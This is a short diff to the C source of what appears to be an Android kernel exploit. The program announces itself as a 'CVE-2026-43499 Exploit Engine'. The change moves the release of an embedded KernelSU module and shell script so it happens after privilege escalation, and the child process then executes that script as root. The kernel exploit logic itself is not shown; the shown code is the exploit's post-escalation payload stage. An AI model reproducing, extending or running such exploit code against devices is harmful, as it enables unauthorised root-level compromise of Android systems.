@@ -732,9 +732,6 @@ int main(int argc, char **argv) {
     return 2;
   }
 
-  ksu_release_module();
-  ksu_release_script();
-
   timer_reset();
   pr_info("CVE-2026-43499 Exploit Engine Initiated\n");
   pr_info("Target PID: %d | UID: %d | GID: %d\n", getpid(), getuid(), getgid());
@@ -873,7 +870,11 @@ int main(int argc, char **argv) {
       _exit(1);
     }
 
-    pr_success("[CHILD] Running root action. Loading KernelSU via /data/local/tmp/kernelsu.sh...\n");
+    /* 提权后释放：内嵌 kernelsu.ko + kernelsu.sh（仅默认模式） */
+    ksu_release_module();
+    ksu_release_script();
+
+    pr_success("[CHILD] Running root action. Loading KernelSU via /data/local/tmp/kernelsu.sh\n");
     setenv("PATH", "/sbin:/system/sbin:/system/bin:/system/xbin", 1);
     execl("/system/bin/sh", "sh", "/data/local/tmp/kernelsu.sh", g_module_path, (char *)NULL);
     pr_warning("[CHILD] exec kernelsu.sh failed: %s\n", strerror(errno));
